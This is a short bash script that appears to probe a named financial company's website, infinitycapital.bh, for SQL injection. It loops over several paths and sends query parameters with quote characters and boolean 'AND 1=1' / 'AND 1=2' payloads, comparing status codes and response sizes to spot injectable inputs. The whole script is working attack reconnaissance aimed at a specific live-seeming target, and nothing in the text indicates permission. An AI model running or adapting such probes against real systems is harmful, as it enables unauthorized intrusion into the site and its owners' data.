#!/bin/bash
# quick differential oracle across all discovered query params
B=https://www.infinitycapital.bh
h(){ curl -s -m 25 "$1" | md5sum | cut -c1-12; }
sz(){ curl -s -m 25 -o /tmp/d.bin -w "%{http_code} %{size_download}" "$1"; }
for u in "/" "/contact" "/404" "/about" "/investment-portfolio"; do
  echo "===== $u"
  for q in "?page=1" "?page=2" "?page=2'" "?page=2%20AND%201=1" "?page=2%20AND%201=2" "?id=1" "?id=1'" "?id=1%20AND%201=1" "?id=1%20AND%201=2" "?search=test" "?cb=1" "?cb=1'" "?q=INJX15" "?x=1"; do
    printf "  %-30s %s\n" "$q" "$(sz "$B$u$q")"
  done
done
